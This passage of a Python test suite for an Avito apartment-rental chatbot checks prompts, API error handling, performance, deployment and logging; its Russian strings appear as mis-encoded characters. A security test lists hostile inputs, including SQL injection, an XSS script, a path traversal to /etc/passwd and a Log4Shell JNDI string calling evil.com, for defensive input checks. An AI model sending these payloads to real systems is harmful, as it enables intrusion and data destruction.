            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–π –ª–æ–≥–∏–∫–∏", str(e))

    async def test_prompts_quality(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∫–∞—á–µ—Å—Ç–≤–∞ –ø—Ä–æ–º–ø—Ç–æ–≤"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ö–ê–ß–ï–°–¢–í–ê –ü–†–û–ú–ü–¢–û–í")
        
        try:
            from config import SYSTEM_PROMPT, EXTRACTION_PROMPT_TEMPLATE, FORBIDDEN_PHRASES
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –ø—Ä–æ–º–ø—Ç–∞
            required_elements = [
                "–°–≤–µ—Ç–ª–∞–Ω–∞", "–∞–≥–µ–Ω—Ç", "–∞—Ä–µ–Ω–¥–µ", "–ê–ù", "Skyline",
                "7 –ø—É–Ω–∫—Ç–æ–≤", "—Å–æ—Å—Ç–∞–≤", "–¥–µ—Ç–∏", "–∂–∏–≤–æ—Ç–Ω—ã–µ", "—Å—Ä–æ–∫", "–¥–∞—Ç–∞", "—Ç–µ–ª–µ—Ñ–æ–Ω"
            ]
            
            missing_elements = [elem for elem in required_elements if elem.lower() not in SYSTEM_PROMPT.lower()]
            if not missing_elements:
                self.result.add_pass("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å–µ –∫–ª—é—á–µ–≤—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã")
            else:
                self.result.add_fail("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç", f"–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç —ç–ª–µ–º–µ–Ω—Ç—ã: {missing_elements}")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã—Ö —Ñ—Ä–∞–∑
            forbidden_found = [phrase for phrase in FORBIDDEN_PHRASES if phrase in SYSTEM_PROMPT.lower()]
            if not forbidden_found:
                self.result.add_pass("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç –Ω–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã—Ö —Ñ—Ä–∞–∑")
            else:
                self.result.add_warning("–°–∏—Å—Ç–µ–º–Ω—ã–π –ø—Ä–æ–º–ø—Ç", f"–°–æ–¥–µ—Ä–∂–∏—Ç –∑–∞–ø—Ä–µ—â–µ–Ω–Ω—ã–µ —Ñ—Ä–∞–∑—ã: {forbidden_found}")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–º–ø—Ç–∞ –∏–∑–≤–ª–µ—á–µ–Ω–∏—è
            extraction_elements = ["{dialog_history}", "JSON", "name", "phone", "residents"]
            missing_extraction = [elem for elem in extraction_elements if elem not in EXTRACTION_PROMPT_TEMPLATE]
            
            if not missing_extraction:
                self.result.add_pass("–ü—Ä–æ–º–ø—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã")
            else:
                self.result.add_fail("–ü—Ä–æ–º–ø—Ç –∏–∑–≤–ª–µ—á–µ–Ω–∏—è", f"–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç: {missing_extraction}")
                
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–º–ø—Ç–æ–≤", str(e))

    async def test_error_handling(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –û–ë–†–ê–ë–û–¢–ö–ò –û–®–ò–ë–û–ö")
        
        try:
            from chat_gpt import ChatGPTHandler
            from telegram import TelegramBot
            
            # –¢–µ—Å—Ç –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ API
            handler = ChatGPTHandler("invalid_key")
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 401  # Unauthorized
                mock_response.text.return_value = "Unauthorized"
                mock_post.return_value.__aenter__.return_value = mock_response
                
                result = await handler._make_request([{"role": "user", "content": "test"}])
                if result is None:
                    self.result.add_pass("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏ OpenAI API")
                else:
                    self.result.add_fail("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏ OpenAI API", "–û—à–∏–±–∫–∞ –Ω–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞")
                    
            # –¢–µ—Å—Ç –æ–±—Ä–∞–±–æ—Ç–∫–∏ –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–≥–æ JSON
            with patch.object(handler, '_make_request') as mock_request:
                mock_request.return_value = "invalid json response"
                
                client_data = await handler.extract_client_data("test dialog")
                if client_data is None:
                    self.result.add_pass("–û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–≥–æ JSON")
                else:
                    self.result.add_fail("–û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–µ–≤–∞–ª–∏–¥–Ω–æ–≥–æ JSON", "–û—à–∏–±–∫–∞ –Ω–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞")
                    
            # –¢–µ—Å—Ç –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ Telegram
            bot = TelegramBot("invalid_token")
            
            with patch('aiohttp.ClientSession.post') as mock_post:
                mock_response = AsyncMock()
                mock_response.status = 403  # Forbidden
                mock_post.return_value.__aenter__.return_value = mock_response
                
                success = await bot.send_message("test_chat", "test")
                if not success:
                    self.result.add_pass("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏ Telegram API")
                else:
                    self.result.add_fail("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–∫–∏ Telegram API", "–û—à–∏–±–∫–∞ –Ω–µ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞")
                    
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫", str(e))

    async def test_performance(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ü–†–û–ò–ó–í–û–î–ò–¢–ï–õ–¨–ù–û–°–¢–ò")
        
        try:
            from main import AvitoRentalBot
            
            bot = AvitoRentalBot()
            
            # –¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
            start_time = time.time()
            for _ in range(100):
                bot.format_dialog_history(self.test_data["mock_messages"])
            end_time = time.time()
            
            processing_time = (end_time - start_time) / 100
            if processing_time < 0.01:  # –ú–µ–Ω–µ–µ 10–º—Å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ
                self.result.add_pass("–°–∫–æ—Ä–æ—Å—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π")
            else:
                self.result.add_warning("–°–∫–æ—Ä–æ—Å—Ç—å –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π", f"{processing_time*1000:.1f}–º—Å –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ")
                
            # –¢–µ—Å—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–∞–º—è—Ç–∏
            import psutil
            process = psutil.Process()
            memory_mb = process.memory_info().rss / 1024 / 1024
            
            if memory_mb < 100:  # –ú–µ–Ω–µ–µ 100MB
                self.result.add_pass("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏")
            elif memory_mb < 200:
                self.result.add_warning("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏", f"{memory_mb:.1f}MB")
            else:
                self.result.add_fail("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏", f"{memory_mb:.1f}MB - —Å–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ")
                
        except ImportError:
            self.result.add_warning("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏", "psutil –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏", str(e))

    async def test_integration_flow(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–Ω–æ–≥–æ –∏–Ω—Ç–µ–≥—Ä–∞—Ü–∏–æ–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ò–ù–¢–ï–ì–†–ê–¶–ò–û–ù–ù–û–ì–û –ü–û–¢–û–ö–ê")
        
        try:
            from main import AvitoRentalBot
            from avito import AvitoClient
            
            # –°–æ–∑–¥–∞–µ–º –±–æ—Ç–∞
            bot = AvitoRentalBot()
            
            # –ú–æ–∫–∞–µ–º –≤—Å–µ –≤–Ω–µ—à–Ω–∏–µ API
            with patch('aiohttp.ClientSession') as mock_session_class:
                mock_session = AsyncMock()
                mock_session_class.return_value = mock_session
                
                # –ú–æ–∫ –¥–ª—è Avito API
                mock_avito_response = AsyncMock()
                mock_avito_response.status = 200
                mock_avito_response.json.return_value = {
                    "access_token": "test_token"
                }
                mock_session.post.return_value.__aenter__.return_value = mock_avito_response
                
                mock_chats_response = AsyncMock()
                mock_chats_response.json.return_value = {"chats": self.test_data["mock_chats"]}
                mock_session.get.return_value.__aenter__.return_value = mock_chats_response
                
                # –ú–æ–∫ –¥–ª—è OpenAI API
                with patch('chat_gpt.get_agent_response') as mock_gpt:
                    mock_gpt.return_value = "–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ, –Ω–∞ —Å–≤—è–∑–∏ –°–≤–µ—Ç–ª–∞–Ω–∞, –ê–ù Skyline"
                    
                    # –ú–æ–∫ –¥–ª—è Telegram API
                    with patch('telegram.send_completed_application') as mock_telegram:
                        mock_telegram.return_value = True
                        
                        # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç–∞ –∏ –ø—ã—Ç–∞–µ–º—Å—è –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å —á–∞—Ç
                        async with AvitoClient("test_user", "test_client", "test_secret") as client:
                            await bot.process_chat(client, "test_chat_1", self.test_data["mock_chats"][0])
                            
                        self.result.add_pass("–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω")
                        
        except Exception as e:
            self.result.add_fail("–ò–Ω—Ç–µ–≥—Ä–∞—Ü–∏–æ–Ω–Ω—ã–π –ø–æ—Ç–æ–∫", str(e))

    async def test_security(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò")
        
        try:
            from config import OPENAI_API_KEY, TELEGRAM_BOT_TOKEN, AVITO_CLIENT_SECRET
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –∑–∞—Ö–∞—Ä–¥–∫–æ–∂–µ–Ω–Ω—ã–µ —Å–µ–∫—Ä–µ—Ç—ã
            secrets_ok = True
            
            if OPENAI_API_KEY and len(OPENAI_API_KEY) > 10 and "test" not in OPENAI_API_KEY.lower():
                if OPENAI_API_KEY != "–í–ê–®_–ê–ü–ò_–ö–õ–Æ–ß":
                    self.result.add_warning("OpenAI API –∫–ª—é—á", "–£–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ –∫–ª—é—á –Ω–µ –ø–æ–ø–∞–¥–µ—Ç –≤ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π")
                else:
                    self.result.add_pass("OpenAI API –∫–ª—é—á –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–ª–µ–π—Å—Ö–æ–ª–¥–µ—Ä")
            
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–∞ SQL injection –∏ XSS
            from main import AvitoRentalBot
            bot = AvitoRentalBot()
            
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "${jndi:ldap://evil.com/x}"
            ]
            
            for malicious_input in malicious_inputs:
                test_message = {
                    "direction": "in",
                    "type": "text", 
                    "content": {"text": malicious_input},
                    "author_id": 123,
                    "created": int(time.time())
                }
                
                try:
                    # –¢–µ—Å—Ç–∏—Ä—É–µ–º —á—Ç–æ –º–∞–ª–∏—Ü–∏–æ–∑–Ω—ã–π –≤–≤–æ–¥ –Ω–µ –≤—ã–∑—ã–≤–∞–µ—Ç –∏—Å–∫–ª—é—á–µ–Ω–∏–π
                    formatted = bot.format_dialog_history([test_message])
                    if malicious_input in formatted:
                        self.result.add_pass("–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω–æ–≥–æ –≤–≤–æ–¥–∞")
                    else:
                        self.result.add_warning("–§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –≤–≤–æ–¥–∞", "–í–≤–æ–¥ –±—ã–ª –∏–∑–º–µ–Ω–µ–Ω")
                except Exception:
                    self.result.add_fail("–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –≤–≤–æ–¥–∞", "–ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –º–∞–ª–∏—Ü–∏–æ–∑–Ω–æ–≥–æ –≤–≤–æ–¥–∞")
                    
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –Ω–æ–º–µ—Ä–æ–≤ —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤
            from config import MIN_PHONE_DIGITS
            
            test_phones = [
                "+7 999 123 45 67",  # –í–∞–ª–∏–¥–Ω—ã–π
                "123",               # –°–ª–∏—à–∫–æ–º –∫–æ—Ä–æ—Ç–∫–∏–π
                "+7 (999) 123-45-67", # –° —Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ–º
                "javascript:alert(1)" # –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω—ã–π
            ]
            
            valid_count = 0
            for phone in test_phones:
                digits_count = len([c for c in phone if c.isdigit()])
                if digits_count >= MIN_PHONE_DIGITS:
                    valid_count += 1
                    
            if valid_count >= 2:  # –ö–∞–∫ –º–∏–Ω–∏–º—É–º 2 –∏–∑ 4 –¥–æ–ª–∂–Ω—ã –ø—Ä–æ–π—Ç–∏ –≤–∞–ª–∏–¥–∞—Ü–∏—é
                self.result.add_pass("–í–∞–ª–∏–¥–∞—Ü–∏—è –Ω–æ–º–µ—Ä–æ–≤ —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤")
            else:
                self.result.add_fail("–í–∞–ª–∏–¥–∞—Ü–∏—è –Ω–æ–º–µ—Ä–æ–≤ —Ç–µ–ª–µ—Ñ–æ–Ω–æ–≤", "–°–ª–∏—à–∫–æ–º —Å—Ç—Ä–æ–≥–∞—è –∏–ª–∏ —Å–ª–∞–±–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è")
                
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏", str(e))

    async def test_deployment_readiness(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∫ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—é"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ì–û–¢–û–í–ù–û–°–¢–ò –ö –†–ê–ó–í–ï–†–¢–´–í–ê–ù–ò–Æ")
        
        try:
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –≤—Å–µ—Ö —Ñ–∞–π–ª–æ–≤
            required_files = [
                "main.py", "config.py", "avito.py", 
                "chat_gpt.py", "telegram.py", "deploy.sh"
            ]
            
            missing_files = []
            for file in required_files:
                if not os.path.exists(file):
                    missing_files.append(file)
                    
            if not missing_files:
                self.result.add_pass("–í—Å–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ–∞–π–ª—ã –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É—é—Ç")
            else:
                self.result.add_fail("–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—â–∏–µ —Ñ–∞–π–ª—ã", str(missing_files))
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–∞ Python —Ñ–∞–π–ª–æ–≤
            python_files = [f for f in required_files if f.endswith('.py')]
            syntax_errors = []
            
            for file in python_files:
                if os.path.exists(file):
                    try:
                        with open(file, 'r', encoding='utf-8') as f:
                            code = f.read()
                        compile(code, file, 'exec')
                    except SyntaxError as e:
                        syntax_errors.append(f"{file}: {e}")
                        
            if not syntax_errors:
                self.result.add_pass("–°–∏–Ω—Ç–∞–∫—Å–∏—Å Python —Ñ–∞–π–ª–æ–≤ –∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω")
            else:
                self.result.add_fail("–°–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫–∏–µ –æ—à–∏–±–∫–∏", str(syntax_errors))
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ deploy.sh
            if os.path.exists("deploy.sh"):
                if os.access("deploy.sh", os.X_OK):
                    self.result.add_pass("deploy.sh –∏–º–µ–µ—Ç –ø—Ä–∞–≤–∞ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ")
                else:
                    self.result.add_warning("deploy.sh", "–ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ (chmod +x deploy.sh)")
                    
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π
            try:
                import aiohttp
                self.result.add_pass("aiohttp —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
            except ImportError:
                self.result.add_fail("–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏", "aiohttp –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
                
            try:
                import asyncio
                self.result.add_pass("asyncio –¥–æ—Å—Ç—É–ø–µ–Ω")
            except ImportError:
                self.result.add_fail("–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏", "asyncio –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–æ–≤ (–Ω–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–∏–º–∏)
            large_files = []
            for file in python_files:
                if os.path.exists(file):
                    size_mb = os.path.getsize(file) / 1024 / 1024
                    if size_mb > 1:  # –ë–æ–ª—å—à–µ 1MB
                        large_files.append(f"{file}: {size_mb:.1f}MB")
                        
            if not large_files:
                self.result.add_pass("–†–∞–∑–º–µ—Ä—ã —Ñ–∞–π–ª–æ–≤ –≤ –Ω–æ—Ä–º–µ")
            else:
                self.result.add_warning("–ë–æ–ª—å—à–∏–µ —Ñ–∞–π–ª—ã", str(large_files))
                
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∫ —Ä–∞–∑–≤–µ—Ä—Ç—ã–≤–∞–Ω–∏—é", str(e))

    async def test_monitoring_and_logging(self):
        """–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è"""
        self.print_header("–¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê –ò –õ–û–ì–ò–†–û–í–ê–ù–ò–Ø")
        
        try:
            from main import AvitoRentalBot
            
            # –¢–µ—Å—Ç —á—Ç–æ –±–æ—Ç –≤—ã–≤–æ–¥–∏—Ç –ª–æ–≥–∏
            import io
            import sys
            
            # –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º stdout
            captured_output = io.StringIO()
            sys.stdout = captured_output
            
            try:
                bot = AvitoRentalBot()
                print("Test log message")
                
                # –í–æ–∑–≤—Ä–∞—â–∞–µ–º stdout
                sys.stdout = sys.__stdout__
                
                output = captured_output.getvalue()
                if "Test log message" in output:
                    self.result.add_pass("–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–∞–±–æ—Ç–∞–µ—Ç")
                else:
                    self.result.add_fail("–õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ", "–õ–æ–≥–∏ –Ω–µ –≤—ã–≤–æ–¥—è—Ç—Å—è")
                    
            finally:
                sys.stdout = sys.__stdout__
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –ª–æ–≥–æ–≤
            test_messages = [
                "–ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ:",
                "–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –æ—Ç–≤–µ—Ç:",
                "–î–∏–∞–ª–æ–≥ –∑–∞–≤–µ—Ä—à–µ–Ω:",
                "Follow-up –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω:"
            ]
            
            # –≠—Ç–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–æ–ª–∂–Ω—ã –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –≤ –∫–æ–¥–µ –¥–ª—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
            main_code = ""
            if os.path.exists("main.py"):
                with open("main.py", 'r', encoding='utf-8') as f:
                    main_code = f.read()
                    
            missing_logs = []
            for message in test_messages:
                if message not in main_code:
                    missing_logs.append(message)
                    
            if not missing_logs:
                self.result.add_pass("–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞")
            else:
                self.result.add_warning("–°—Ç—Ä—É–∫—Ç—É—Ä–∞ –ª–æ–≥–æ–≤", f"–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç: {missing_logs}")
                
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏–π —Å –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º
            exception_patterns = ["try:", "except", "print(f\"Error", "print(f\"–û—à–∏–±–∫–∞"]
            has_error_handling = any(pattern in main_code for pattern in exception_patterns)
            
            if has_error_handling:
                self.result.add_pass("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ —Å –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º")
            else:
                self.result.add_fail("–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫", "–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ try/except –±–ª–æ–∫–æ–≤")
                
        except Exception as e:
            self.result.add_fail("–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞", str(e))

    async def run_load_test(self):
        """–ù–∞–≥—Ä—É–∑–æ—á–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ"""
        self.print_header("–ù–ê–ì–†–£–ó–û–ß–ù–û–ï –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ï")
        
        try:
            from main import AvitoRentalBot
            
            bot = AvitoRentalBot()
            
            # –¢–µ—Å—Ç –æ–±—Ä–∞–±–æ—Ç–∫–∏ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö —á–∞—Ç–æ–≤
            start_time = time.time()
            
            # –°–æ–∑–¥–∞–µ–º –º–Ω–æ–≥–æ —Ç–µ—Å—Ç–æ–≤—ã—Ö —á–∞—Ç–æ–≤
            test_chats = []
            for i in range(50):
                chat_data = {
                    "id": f"chat_{i}",
                    "context": {"value": {"title": f"–ö–≤–∞—Ä—Ç–∏—Ä–∞ {i}"}}
                }
                test_chats.append(chat_data)
                
            # –ú–æ–∫–∞–µ–º –≤–Ω–µ—à–Ω–∏–µ API –¥–ª—è –Ω–∞–≥—Ä—É–∑–æ—á–Ω–æ–≥–æ —Ç–µ—Å—Ç–∞
            with patch('chat_gpt.get_agent_response') as mock_gpt, \
                 patch('telegram.send_completed_application') as mock_telegram:
                
                mock_gpt.return_value = "–¢–µ—Å—Ç–æ–≤—ã–π –æ—Ç–≤–µ—Ç"
                mock_telegram.return_value = True
                
                # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤—Å–µ —á–∞—Ç—ã
                processed = 0
                for chat_data in test_chats:
                    try:
                        # –ò–º–∏—Ç–∏—Ä—É–µ–º –±—ã—Å—Ç—Ä—É—é –æ–±—Ä–∞–±–æ—Ç–∫—É
                        bot.chat_states[chat_data["id"]] = []
                        processed += 1
                    except Exception:
                        pass
                        
            end_time = time.time()
            processing_time = end_time - start_time
            
            if processed >= 45:  # 90% —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ
                self.result.add_pass(f"–ù–∞–≥—Ä—É–∑–æ—á–Ω—ã–π —Ç–µ—Å—Ç ({processed}/50 —á–∞—Ç–æ–≤ –∑–∞ {processing_time:.1f}—Å)")
            else:
                self.result.add_fail("–ù–∞–≥—Ä—É–∑–æ—á–Ω—ã–π —Ç–µ—Å—Ç", f"–û–±—Ä–∞–±–æ—Ç–∞–Ω–æ —Ç–æ–ª—å–∫–æ {processed}/50 —á–∞—Ç–æ–≤")
                
            # –¢–µ—Å—Ç –ø–∞–º—è—Ç–∏ –ø—Ä–∏ –±–æ–ª—å—à–æ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–µ —Å–æ—Å—Ç–æ—è–Ω–∏–π
            initial_states = len(bot.chat_states)
            
            # –î–æ–±–∞–≤–ª—è–µ–º –º–Ω–æ–≥–æ —Å–æ—Å—Ç–æ—è–Ω–∏–π
            for i in range(1000):
                bot.chat_states[f"load_test_{i}"] = [f"message_{j}" for j in range(10)]
                
            final_states = len(bot.chat_states)
            
            if final_states >= initial_states + 900:  # 90% —Å–æ—Å—Ç–æ—è–Ω–∏–π —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ
                self.result.add_pass("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏ –ø—Ä–∏ –Ω–∞–≥—Ä—É–∑–∫–µ")
            else:
                self.result.add_fail("–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏—è–º–∏", "–ü–æ—Ç–µ—Ä—è —Å–æ—Å—Ç–æ—è–Ω–∏–π –ø—Ä–∏ –Ω–∞–≥—Ä—É–∑–∫–µ")
                
        except Exception as e:
